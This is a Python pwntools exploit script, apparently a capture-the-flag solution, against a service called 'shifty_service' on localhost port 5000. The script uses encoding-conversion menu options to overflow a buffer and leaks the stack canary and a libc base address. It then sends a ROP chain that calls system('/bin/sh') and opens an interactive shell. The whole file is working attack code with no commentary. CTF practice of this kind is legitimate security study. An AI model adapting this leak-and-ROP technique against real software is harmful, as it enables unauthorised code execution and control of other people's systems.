from pwn import *

REMOTE = True
script = "./shifty_service"

# context.log_level='debug'
context.arch = 'amd64'

e = ELF(script)
libc = ELF("./libc.so.6")

io = process(script) if not REMOTE else remote("localhost",5000)


io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Index to input (0-2) > ", b"0")
io.sendlineafter(b" > ", b"\xff")

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Source index (0-2) > ", b"0")
io.sendlineafter(b"Destination index (0-2) > ", b"3")
io.sendlineafter(b"From encoding > ", b"UTF-8")
io.sendlineafter(b"To encoding > ", b"UTF-8")

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Source index (0-2) > ", b"3")
io.sendlineafter(b"Destination index (0-2) > ", b"0")
io.sendlineafter(b"From encoding > ", b"LATIN1")
io.sendlineafter(b"To encoding > ", b"LATIN1")

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Index to input (0-2) > ", b"0")
io.sendlineafter(b" > ", b"a" * 0x50)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Index to output (0-2) > ", b"0")
io.recvline()
io.recvline()
canary = b'\x00' + io.recvline()[:7]
print("canary", canary.hex())

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Index to input (0-2) > ", b"0")
io.sendlineafter(b" > ", b"a" * (0x60-1))

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Index to output (0-2) > ", b"0")
io.recvline()
io.recvline()
leak = int.from_bytes(io.recvline()[:-1], byteorder='little')
libc.address = leak - 0x2a1ca
print("libc", hex(libc.address))

rop = ROP(libc)
rop.raw(cyclic(cyclic_find('uaaa')))
rop.raw(canary)
rop.raw(b"x" * 8)
rop.raw(rop.find_gadget(['ret']))
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])


io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Index to input (0-2) > ", b"0")
io.sendlineafter(b" > ", rop.chain())


io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Source index (0-2) > ", b"0")
io.sendlineafter(b"Destination index (0-2) > ", b"3")
io.sendlineafter(b"From encoding > ", b"LATIN1")
io.sendlineafter(b"To encoding > ", b"LATIN1")


io.sendlineafter(b"> ", b"9")
io.interactive()